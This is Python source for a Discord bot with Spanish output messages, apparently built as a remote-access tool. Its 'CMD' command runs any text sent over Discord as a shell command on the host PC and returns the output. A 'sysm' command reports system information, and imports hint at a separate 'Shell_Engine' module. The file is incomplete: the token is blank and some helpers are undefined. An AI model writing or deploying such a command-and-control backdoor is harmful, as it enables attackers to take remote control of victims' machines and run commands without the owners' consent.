import subprocess
import pprint
import sys
import time
from discord import message
from Shell_Engine import *
from discord.ext import commands
import discord
import base64
import ctypes
import getpass
import os
import platform
import re
import socket
import subprocess
import urllib.request
import sys


bot = discord.Client()

token = ''

import string
import discord
import random
from discord import message
from discord.ext import commands
import logging

logger = logging.getLogger('discord')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)



description = '''yes'''

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', description=description, intents=intents)


@bot.event
async def on_ready():
    print("-----------------------------------------------")
    print("[!] Iniciando seccion como: ", bot.user.name)
    print("[!] ID: ", bot.user.id)
    print("-----------------------------------------------")

@bot.command()
async def add(ctx, left: int, right: int):
    try: 
        await ctx.send(left + right)
    except Exception:
        left = ""
        await ctx.send("necesitas dar 2 numeros para la suma")
        return


@bot.command()
async def CMD(ctx, input: str):
    """executes commands on the pc"""
    comando = input
    b = subprocess.check_output(comando, shell=True)
    output = b.decode('cp1252')
    await ctx.send(output)

@bot.command()
async def c(ctx):
    """custom help message"""
    await ctx.send(help_message)


@bot.command()
async def sysm(ctx):
    """returns system information"""
    sysinfo = get_system_info()
    await ctx.send(sysinfo)


bot.run(token)